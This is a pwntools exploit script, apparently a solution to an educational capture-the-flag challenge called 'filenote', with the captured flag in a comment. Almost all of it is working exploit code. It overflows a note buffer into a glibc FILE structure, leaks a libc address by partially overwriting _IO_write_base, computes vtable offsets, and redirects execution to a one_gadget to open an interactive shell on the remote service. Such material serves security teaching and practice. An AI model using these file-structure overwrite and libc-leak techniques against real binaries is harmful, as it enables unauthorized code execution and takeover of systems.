from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF('./libc.so.6')
env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./libc.so.6")}
#r = process('./filenote/chal')
#r = process('./filenote/chal', env=env)
#r = remote('filenote_release_filenote_1', 30218)
r = remote('edu-ctf.zoolab.org', 30218)

def menu(opt, payload=None):
    r.recvuntil(b"> ")
    r.sendline(opt)
    if opt == "2":
        r.recvuntil(b"> ")
        r.sendline(payload)


# offset from note_buf to fp's _flags
offset = 0x55719847d4b0 - 0x55719847d2a0
# Overwrite fp such that the file structure uses _IO_IS_APPENDING
# Only overwrite _flags and _fileno this time
_flags = 0xfbad1800
payload = b'A'*offset
payload += flat(
    _flags, 0,
    0, 0,
    0, 0,
    0, 0,
    0, 0,
    0, 0,
    0, 0,
    1
)
# The goal for this overflow is to control the value of _flags and _fileno
menu("1")
menu("2", payload)
menu("3")

# The file structure doesn't have proper address on any pointer
# We can utilize the help of fwrite function to make it fills in valid address
# Not sure if we should maintain the _flags value
# Get valid address on file structure
# Overflow the file structure
payload = b'A'*offset
payload += flat(
    _flags
)
menu("2", payload)
menu("3")


# Partial overwrite the least-significant byte of _IO_write_base
# Since _IO_write_base points to some valid address
# We can now leak all the bytes between _IO_write_base and _IO_write_ptr
# This includes address in libc
payload = b'A'*offset
payload += flat(
    _flags, 0,
    0, 0
)
# sendline will add \x00 at the end, so we don't need to add it in the payload
# This '\x00' is used for partial overwrite on _IO_write_base
menu("2", payload)
menu("3")


# Call fwrite again to leak the libc address
for i in range(6):
    menu("3")
# read garbage before the leaked address
s = r.recv(0x80)

# Calculate libc base address
libc_base_addr = u64(r.recv(6)+b'\x00\x00') - 0x1ecf60
_IO_file_jumps = libc_base_addr + elf.sym['_IO_file_jumps']
_IO_new_file_finish = _IO_file_jumps + 0x10
_IO_file_overflow = _IO_file_jumps + 0x18
_IO_file_underflow = _IO_file_jumps + 0x20
_IO_default_uflow = _IO_file_jumps + 0x28
_IO_default_pbackfail = _IO_file_jumps + 0x30
_IO_new_file_xsputn = _IO_file_jumps + 0x38
_IO_file_xsgetn = _IO_file_jumps + 0x40
_IO_new_file_seekoff = _IO_file_jumps + 0x48
_IO_default_seekpos = _IO_file_jumps + 0x50
_IO_new_file_setbuf = _IO_file_jumps + 0x58
_IO_new_file_sync = _IO_file_jumps + 0x60
_IO_file_doallocate = _IO_file_jumps + 0x68
_IO_file_read = _IO_file_jumps + 0x70
_IO_new_file_write = _IO_file_jumps + 0x78
_IO_file_seek = _IO_file_jumps + 0x80
_IO_file_close = _IO_file_jumps + 0x88
_IO_file_stat = _IO_file_jumps + 0x90
_IO_default_showmanyc = _IO_file_jumps + 0x98
_IO_default_imbue = _IO_file_jumps + 0xa0

# 0xe6c7e, 0xe6c81, 0xe6c84
one_gadget = p64(libc_base_addr + 0xe6c81)
_flags = 0xfbad1800
payload = b'A'*offset
payload += flat(
    _flags, 0,
    0, 0,
    0, _IO_default_uflow,
    _IO_default_uflow+0x8
)


menu("2", payload)
menu("2", one_gadget)

menu("3")

#gdb.attach(r, "init-pwndbg")

r.interactive()
#FLAG{f1l3n073_15_b3773r_7h4n_h34pn073}